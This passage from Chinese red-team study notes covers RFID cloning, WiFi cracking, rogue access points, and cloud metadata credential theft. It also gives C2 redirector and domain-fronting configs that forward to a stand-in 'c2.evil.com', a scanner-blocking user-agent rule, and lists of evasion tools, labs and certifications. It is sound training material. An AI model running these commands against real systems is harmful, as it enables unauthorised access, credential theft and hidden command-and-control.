│   3. 设备访问                                                   │
│      ├── 无人值守的计算机                                       │
│      ├── 打印机/复印机                                          │
│      └── 服务器机房                                             │
│                                                                 │
│   4. 信息收集                                                   │
│      ├── 垃圾搜索 (Dumpster Diving)                             │
│      ├── 肩窥 (Shoulder Surfing)                                │
│      └── 窃听                                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 15.2 RFID 攻击

```bash
# ==================== Proxmark3 ====================

# 读取卡片
proxmark3> lf search                     # 低频卡搜索
proxmark3> hf search                     # 高频卡搜索

# 克隆 HID 卡
proxmark3> lf hid read                   # 读取 HID 卡
proxmark3> lf hid clone 2006xxxxxxxx     # 克隆到 T5577 卡

# 克隆 EM4100 卡
proxmark3> lf em 410x read               # 读取
proxmark3> lf em 410x clone --id xxxxxxxxxx  # 克隆

# MIFARE Classic 攻击
proxmark3> hf mf autopwn                 # 自动破解
proxmark3> hf mf dump                    # 导出数据
proxmark3> hf mf restore                 # 写入数据

# ==================== Flipper Zero ====================

# 读取 RFID
# Sub-GHz -> Read
# NFC -> Read

# 克隆卡片
# 读取后保存，然后 Emulate
```

### 15.3 无线攻击

```bash
# ==================== WiFi 攻击 ====================

# 监控模式
airmon-ng start wlan0

# 扫描网络
airodump-ng wlan0mon

# 抓取握手包
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# 发送 Deauth
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# 破解密码
aircrack-ng -w wordlist.txt capture-01.cap

# ==================== 恶意热点 ====================

# 创建恶意 AP
hostapd-wpe hostapd.conf

# 配置文件 hostapd.conf
interface=wlan0
driver=nl80211
ssid=Free_WiFi
channel=6

# 配合 dnsmasq 提供 DHCP
dnsmasq -C dnsmasq.conf

# ==================== 蓝牙攻击 ====================

# 扫描设备
hcitool scan
bluetoothctl
> scan on

# 蓝牙嗅探
btlejack -d XX:XX:XX:XX:XX:XX
```

---

## 16. 云安全攻防

### 16.1 AWS 攻击

```bash
# ==================== 信息收集 ====================

# 枚举 S3 存储桶
aws s3 ls s3://bucket-name --no-sign-request
aws s3 ls s3://bucket-name --profile stolen_creds

# 枚举 IAM
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name username

# 枚举 EC2
aws ec2 describe-instances
aws ec2 describe-security-groups

# ==================== 凭证获取 ====================

# 元数据服务 (SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# IMDSv2 (需要 Token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# ==================== 权限提升 ====================

# 使用 Pacu
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan

# 常见提权路径
# - iam:CreateAccessKey
# - iam:CreateLoginProfile
# - iam:AttachUserPolicy
# - iam:PassRole + lambda:CreateFunction
# - iam:PassRole + ec2:RunInstances
```

### 16.2 Azure 攻击

```bash
# ==================== 信息收集 ====================

# Azure CLI
az login
az account list
az ad user list
az ad group list
az vm list

# 枚举存储账户
az storage account list
az storage container list --account-name <name>

# ==================== 凭证获取 ====================

# 元数据服务
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# ==================== 工具 ====================

# ROADtools
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui

# AzureHound
azurehound -u user@domain.com -p password
```

### 16.3 GCP 攻击

```bash
# ==================== 信息收集 ====================

# gcloud CLI
gcloud auth login
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list

# ==================== 凭证获取 ====================

# 元数据服务
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# ==================== 存储桶 ====================

# 枚举存储桶
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/file ./
```

---

## 17. 红队工具库

### 17.1 信息收集工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Nmap | 端口扫描、服务识别 | nmap.org |
| Masscan | 大规模快速端口扫描 | github.com/robertdavidgraham/masscan |
| Subfinder | 子域名枚举 | github.com/projectdiscovery/subfinder |
| Amass | 子域名枚举 | github.com/OWASP/Amass |
| theHarvester | 邮箱、子域名收集 | github.com/laramies/theHarvester |
| Shodan | 互联网设备搜索 | shodan.io |
| Censys | 互联网资产搜索 | censys.io |

### 17.2 漏洞扫描工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Nessus | 综合漏洞扫描 | tenable.com |
| OpenVAS | 开源漏洞扫描 | openvas.org |
| Nuclei | 模板化漏洞扫描 | github.com/projectdiscovery/nuclei |
| Nikto | Web 漏洞扫描 | github.com/sullo/nikto |
| WPScan | WordPress 扫描 | wpscan.com |

### 17.3 漏洞利用工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Metasploit | 漏洞利用框架 | metasploit.com |
| Cobalt Strike | 商业红队平台 | cobaltstrike.com |
| SQLMap | SQL 注入 | sqlmap.org |
| Burp Suite | Web 渗透测试 | portswigger.net |
| BeEF | 浏览器利用框架 | beefproject.com |

### 17.4 后渗透工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Mimikatz | Windows 凭证获取 | github.com/gentilkiwi/mimikatz |
| BloodHound | AD 攻击路径分析 | github.com/BloodHoundAD/BloodHound |
| PowerSploit | PowerShell 后渗透 | github.com/PowerShellMafia/PowerSploit |
| Impacket | 网络协议工具集 | github.com/SecureAuthCorp/impacket |
| CrackMapExec | 内网渗透瑞士军刀 | github.com/byt3bl33d3r/CrackMapExec |
| Evil-WinRM | WinRM Shell | github.com/Hackplayers/evil-winrm |

### 17.5 C2 框架

| 工具 | 特点 | 链接 |
|------|------|------|
| Cobalt Strike | 商业、功能全面 | cobaltstrike.com |
| Havoc | 开源、现代化 | github.com/HavocFramework/Havoc |
| Sliver | 开源、跨平台 | github.com/BishopFox/sliver |
| Mythic | 开源、可扩展 | github.com/its-a-feature/Mythic |
| Covenant | .NET、开源 | github.com/cobbr/Covenant |
| Empire | PowerShell/Python | github.com/BC-SECURITY/Empire |

### 17.6 免杀工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Veil | Payload 生成 | github.com/Veil-Framework/Veil |
| Shellter | PE 注入 | shellterproject.com |
| Donut | .NET 转 Shellcode | github.com/TheWover/donut |
| ScareCrow | EDR 绕过 | github.com/optiv/ScareCrow |
| Nimcrypt2 | Nim 加密器 | github.com/icyguider/Nimcrypt2 |

---

## 18. 红队基础设施

### 18.1 C2 基础设施

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队基础设施架构                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   目标网络                                                      │
│       │                                                         │
│       ▼                                                         │
│   ┌─────────┐                                                   │
│   │ 重定向器 │  ← 流量转发、隐藏真实 C2                         │
│   └────┬────┘                                                   │
│        │                                                        │
│        ▼                                                        │
│   ┌─────────┐                                                   │
│   │  CDN    │  ← 域前置、流量混淆                               │
│   └────┬────┘                                                   │
│        │                                                        │
│        ▼                                                        │
│   ┌─────────┐                                                   │
│   │ C2 服务器│  ← 命令控制中心                                  │
│   └─────────┘                                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 18.2 重定向器配置

```bash
# ==================== Nginx 重定向 ====================

# /etc/nginx/sites-available/redirector
server {
    listen 80;
    server_name redirector.com;
    
    location / {
        # 检查 User-Agent
        if ($http_user_agent !~* "Mozilla") {
            return 404;
        }
        
        # 转发到 C2
        proxy_pass https://c2-server.com;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# ==================== Apache mod_rewrite ====================

# .htaccess
RewriteEngine On

# 阻止扫描器
RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|nikto|sqlmap) [NC]
RewriteRule .* - [F,L]

# 转发特定 URI
RewriteCond %{REQUEST_URI} ^/api/.*
RewriteRule ^(.*)$ https://c2-server.com/$1 [P,L]

# ==================== iptables 转发 ====================

# 启用转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 端口转发
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination C2_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# ==================== socat 转发 ====================

socat TCP-LISTEN:443,fork TCP:C2_IP:443
```

### 18.3 域前置

```bash
# ==================== 域前置原理 ====================

# 利用 CDN 的特性
# 外部看到的是 CDN 域名
# 实际请求的是 C2 域名

# 请求示例
curl -H "Host: c2.evil.com" https://cdn.cloudflare.com/

# ==================== Cloudflare Workers ====================

// worker.js
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    const url = new URL(request.url)
    url.hostname = 'c2.evil.com'
    
    return fetch(url, {
        method: request.method,
        headers: request.headers,
        body: request.body
    })
}

# ==================== Azure CDN ====================

# 配置自定义域名
# 将 CDN 端点指向 C2 服务器
# 使用 Azure 域名作为前端
```

### 18.4 日志与监控

```bash
# ==================== 操作日志 ====================

# 记录所有操作
script -a /var/log/redteam/session_$(date +%Y%m%d_%H%M%S).log

# Cobalt Strike 日志
# 自动保存在 logs/ 目录

# ==================== 流量监控 ====================

# tcpdump 抓包
tcpdump -i eth0 -w capture.pcap

# 监控 C2 连接
watch -n 5 'netstat -an | grep ESTABLISHED'

# ==================== 告警 ====================

# 监控异常
# - C2 连接断开
# - 被检测到的 IOC
# - 目标系统异常
```

---

## 19. 实战演练

### 19.1 靶场推荐

| 平台 | 难度 | 特点 | 链接 |
|------|------|------|------|
| HackTheBox | 中-高 | 真实环境、定期更新 | hackthebox.com |
| TryHackMe | 低-中 | 学习路径、新手友好 | tryhackme.com |
| VulnHub | 低-高 | 离线靶机、免费 | vulnhub.com |
| PentesterLab | 低-中 | Web 安全专注 | pentesterlab.com |
| PortSwigger Academy | 低-中 | Web 安全、免费 | portswigger.net/web-security |
| DVWA | 低 | Web 漏洞练习 | github.com/digininja/DVWA |
| Metasploitable | 低 | 漏洞练习 | sourceforge.net |

### 19.2 CTF 比赛

```bash
# ==================== CTF 类型 ====================

# Jeopardy（解题模式）
# - Web: Web 安全漏洞
# - Pwn: 二进制漏洞利用
# - Reverse: 逆向工程
# - Crypto: 密码学
# - Misc: 杂项
# - Forensics: 取证

# Attack-Defense（攻防模式）
# - 攻击其他队伍
# - 防守自己服务

# King of the Hill
# - 控制目标主机
# - 保持控制权

# ==================== CTF 平台 ====================

# CTFtime: ctftime.org
# 国内: XCTF、强网杯、网鼎杯

# ==================== CTF 工具 ====================

# Web
# - Burp Suite
# - SQLMap
# - dirsearch

# Pwn
# - pwntools
# - GDB + peda/gef
# - ROPgadget

# Reverse
# - IDA Pro
# - Ghidra
# - x64dbg

# Crypto
# - CyberChef
# - hashcat
# - John the Ripper
```

### 19.3 红队演练流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队演练完整流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   阶段一：准备 (1-2周)                                          │
│   ├── 确定目标和范围                                            │
│   ├── 签署授权协议                                              │
│   ├── 搭建基础设施                                              │
│   └── 准备工具和 Payload                                        │
│                                                                 │
│   阶段二：侦察 (1-2周)                                          │
│   ├── 被动信息收集                                              │
│   ├── 主动信息收集                                              │
│   ├── 社工信息收集                                              │
│   └── 攻击面分析                                                │
│                                                                 │
│   阶段三：初始访问 (1-4周)                                      │
│   ├── 漏洞利用                                                  │
│   ├── 钓鱼攻击                                                  │
│   ├── 物理入侵                                                  │
│   └── 供应链攻击                                                │
│                                                                 │
│   阶段四：建立据点 (持续)                                       │
│   ├── 权限提升                                                  │
│   ├── 持久化                                                    │
│   ├── 规避检测                                                  │
│   └── 建立 C2 通道                                              │
│                                                                 │
│   阶段五：内网渗透 (2-4周)                                      │
│   ├── 内网信息收集                                              │
│   ├── 横向移动                                                  │
│   ├── 域渗透                                                    │
│   └── 数据收集                                                  │
│                                                                 │
│   阶段六：目标达成                                              │
│   ├── 获取目标数据                                              │
│   ├── 控制关键系统                                              │
│   └── 模拟业务影响                                              │
│                                                                 │
│   阶段七：报告 (1周)                                            │
│   ├── 整理攻击路径                                              │
│   ├── 编写报告                                                  │
│   ├── 提供修复建议                                              │
│   └── 复盘总结                                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 20. 职业发展

### 20.1 技能要求

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队技能矩阵                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   初级红队 (0-2年)                                              │
│   ├── 熟练使用渗透测试工具                                      │
│   ├── 掌握常见漏洞原理和利用                                    │
│   ├── 基本的编程能力 (Python/Bash)                              │
│   └── 了解网络和操作系统基础                                    │
│                                                                 │
│   中级红队 (2-5年)                                              │
│   ├── 内网渗透和域渗透                                          │
│   ├── 免杀和对抗技术                                            │
│   ├── 代码审计能力                                              │
│   ├── 自动化脚本开发                                            │
│   └── 社会工程学                                                │
│                                                                 │
│   高级红队 (5年以上)                                            │
│   ├── 漏洞挖掘和 Exploit 开发                                   │
│   ├── 恶意软件开发                                              │
│   ├── 红队基础设施设计                                          │
│   ├── APT 攻击模拟                                              │
│   └── 团队管理和项目管理                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 20.2 认证推荐

| 认证 | 难度 | 侧重点 | 推荐度 |
|------|------|--------|--------|
| OSCP | 中 | 渗透测试基础 | ⭐⭐⭐⭐⭐ |
| OSEP | 高 | 高级渗透、免杀 | ⭐⭐⭐⭐⭐ |
| OSWE | 高 | Web 安全、代码审计 | ⭐⭐⭐⭐ |
| CRTO | 中 | 红队操作 | ⭐⭐⭐⭐⭐ |
| CRTP | 中 | AD 攻击 | ⭐⭐⭐⭐ |
| CRTE | 高 | 高级 AD 攻击 | ⭐⭐⭐⭐ |
| GPEN | 中 | 渗透测试 | ⭐⭐⭐ |
| GXPN | 高 | 高级渗透 | ⭐⭐⭐⭐ |

### 20.3 职业路径

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队职业发展路径                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   安全工程师 → 渗透测试工程师 → 红队成员 → 红队负责人           │
│                                    ↓                            │
│                              安全研究员                          │
│                                    ↓                            │
│                              安全顾问/架构师                     │
│                                    ↓                            │
│                              CISO/安全总监                       │
│                                                                 │
│   薪资参考（国内）：                                            │
│   - 初级：15-25K/月                                             │
│   - 中级：25-40K/月                                             │
│   - 高级：40-80K/月                                             │
│   - 专家：80K+/月                                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 22.2 在线课程

| 平台 | 课程 | 特点 |
|------|------|------|
| Offensive Security | OSCP/OSEP/OSWE | 业界认可度最高 |
| PentesterAcademy | CRTP/CRTE | AD 攻击专精 |
| Zero-Point Security | CRTO | 红队操作 |
| eLearnSecurity | eCPPT/eWPT | 性价比高 |
| HackTheBox Academy | 各类课程 | 实战导向 |
| TryHackMe | 学习路径 | 新手友好 |
| PortSwigger Academy | Web 安全 | 免费、高质量 |

### 22.3 在线资源

```bash
# ==================== 技术博客 ====================

# 国外
- SpecterOps Blog: https://posts.specterops.io/
- Harmj0y Blog: https://blog.harmj0y.net/
- ired.team: https://www.ired.team/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

# 国内
- 先知社区: https://xz.aliyun.com/
- FreeBuf: https://www.freebuf.com/
- 安全客: https://www.anquanke.com/
- 看雪论坛: https://bbs.pediy.com/

# ==================== GitHub 资源 ====================

# 工具集合
- https://github.com/enaqx/awesome-pentest
- https://github.com/Hack-with-Github/Awesome-Hacking
- https://github.com/infosecn1nja/Red-Teaming-Toolkit

# 学习资源
- https://github.com/vitalysim/Awesome-Hacking-Resources
- https://github.com/trimstray/the-book-of-secret-knowledge

# Cheat Sheets
- https://github.com/coreb1t/awesome-pentest-cheat-sheets
- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

# ==================== 视频资源 ====================

# YouTube 频道
- IppSec: HackTheBox 靶机讲解
- John Hammond: CTF 和安全研究
- LiveOverflow: 安全研究和漏洞分析
- The Cyber Mentor: 渗透测试教程

# B站
- 搜索：渗透测试、红队、内网渗透
```

### 22.4 社区与会议

```
┌─────────────────────────────────────────────────────────────────┐
│                    安全社区与会议                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   国际会议：                                                    │
│   ├── DEF CON - 最大的黑客会议                                  │
│   ├── Black Hat - 商业安全会议                                  │
│   ├── RSA Conference - 企业安全                                 │
│   ├── BSides - 社区安全会议                                     │
│   └── HITB - 亚洲顶级安全会议                                   │
│                                                                 │
│   国内会议：                                                    │
│   ├── KCon - 知道创宇安全会议                                   │
│   ├── XCon - 安全焦点会议                                       │
│   ├── MOSEC - 移动安全会议                                      │
│   ├── CSS - 中国互联网安全大会                                  │
│   └── 补天白帽大会                                              │
│                                                                 │
│   在线社区：                                                    │
│   ├── Reddit: r/netsec, r/AskNetsec                             │
│   ├── Discord: 各种安全服务器                                   │
│   ├── Twitter: 关注安全研究员                                   │
│   └── 国内：先知、FreeBuf、看雪                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 22.5 实验环境搭建

```bash
# ==================== 本地实验环境 ====================

# 虚拟化平台
# - VMware Workstation Pro
# - VirtualBox (免费)
# - Proxmox (服务器)

# 攻击机
# - Kali Linux
# - Parrot OS
# - BlackArch

# 靶机
# - Metasploitable 2/3
# - DVWA
# - VulnHub 靶机
# - HackTheBox 靶机

# ==================== 域环境搭建 ====================

# 最小域环境
# 1. Windows Server 2019 (DC)
# 2. Windows 10 (工作站)
# 3. Windows Server 2019 (成员服务器)

# 自动化搭建
# - DVAD: https://github.com/SpecterOps/dvad
# - DVAD: https://github.com/Orange-Cyberdefense/GOAD
# - AutomatedLab: https://github.com/AutomatedLab/AutomatedLab

# ==================== 云实验环境 ====================

# AWS
# - 使用 Free Tier
# - 搭建 VPC 和 EC2

# Azure
# - 使用免费额度
# - 搭建 AD 环境

# 注意事项
# - 不要在云上进行攻击测试
# - 确保安全组配置正确
# - 及时关闭不用的资源
```

---

## 总结

### 红队核心能力模型

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队核心能力模型                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                        ┌─────────┐                              │
│                        │  思维   │                              │
│                        │ 攻击者  │                              │
│                        │  视角   │                              │
│                        └────┬────┘                              │
│                             │                                   │
│         ┌───────────────────┼───────────────────┐               │
│         │                   │                   │               │
│    ┌────┴────┐         ┌────┴────┐         ┌────┴────┐          │
│    │  技术   │         │  工具   │         │  软技能 │          │
│    │  能力   │         │  能力   │         │         │          │
│    └────┬────┘         └────┬────┘         └────┬────┘          │
│         │                   │                   │               │
│    ├─ 网络     │       ├─ 信息收集 │       ├─ 报告写作 │         │
│    ├─ 系统     │       ├─ 漏洞利用 │       ├─ 沟通能力 │         │
│    ├─ 编程     │       ├─ 后渗透   │       ├─ 团队协作 │         │
│    ├─ 逆向     │       ├─ C2框架   │       ├─ 项目管理 │         │
│    └─ 密码学   │       └─ 免杀     │       └─ 持续学习 │         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 成为顶级红队的关键

```
┌─────────────────────────────────────────────────────────────────┐
│                    成为顶级红队的关键要素                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 持续学习                                                   │
│      ├── 安全领域日新月异，必须保持学习                         │
│      ├── 关注最新漏洞和攻击技术                                 │
│      ├── 阅读安全研究论文和博客                                 │
│      └── 参加安全会议和培训                                     │
│                                                                 │
│   2. 实战经验                                                   │
│      ├── 理论必须结合实践                                       │
│      ├── 多参与真实项目                                         │
│      ├── 从失败中学习                                           │
│      └── 积累案例和经验                                         │
│                                                                 │
│   3. 创新思维                                                   │
│      ├── 不要局限于已知方法                                     │
│      ├── 尝试新的攻击路径                                       │
│      ├── 开发自己的工具                                         │
│      └── 研究新型攻击技术                                       │
│                                                                 │
│   4. 团队协作                                                   │
│      ├── 红队是团队作战                                         │
│      ├── 发挥各自专长                                           │
│      ├── 有效沟通和协调                                         │
│      └── 知识共享和传承                                         │
│                                                                 │
│   5. 职业道德                                                   │
│      ├── 遵守法律法规                                           │
│      ├── 保护客户数据                                           │
│      ├── 负责任地披露漏洞                                       │
│      └── 维护行业声誉                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 最后的话

红队之路漫长而艰辛，但也充满挑战和乐趣。记住以下几点：

1. **基础决定高度** - 扎实的基础知识是一切的根基
2. **实践出真知** - 动手实践比看一百篇文章更有效
3. **保持好奇心** - 对技术的热爱是持续进步的动力
4. **遵守底线** - 技术是中性的，但使用者要有道德
5. **回馈社区** - 分享知识，帮助他人，共同进步

> "The quieter you become, the more you can hear."
> — 越安静，你能听到的越多。

祝你在红队之路上越走越远！

---

*本笔记持续更新中，欢迎补充和指正。*

*最后更新：2024年*
